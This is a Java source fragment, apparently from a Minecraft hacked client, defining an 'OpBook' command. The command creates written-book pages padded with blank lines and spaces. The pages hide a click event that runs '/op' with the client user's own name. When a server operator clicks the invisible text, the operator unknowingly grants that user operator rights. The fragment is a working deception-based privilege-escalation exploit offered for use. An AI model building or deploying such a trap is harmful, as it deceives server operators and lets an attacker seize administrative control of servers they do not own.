...
public class OpBook extends Command {
    public OpBook() {
        super("OpBook", "OpBook", "OpBook");
    }
    ...
    public void onCommand(String command, String[] args) {
        if (args.length == 1) {
            ...
            for (int i = 0; i < 4; i++) {
                pages.appendTag((NBTBase) new NBTTagString("{\"extra\":[\"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\",{\"clickEvent\":{\"action\":\"run_command\",\"value\":\"/op " + Minecraft.getMinecraft().getSession().getUsername() + "\"},\"text\":\"                             \"}],\"text\":\"                             \"}"));
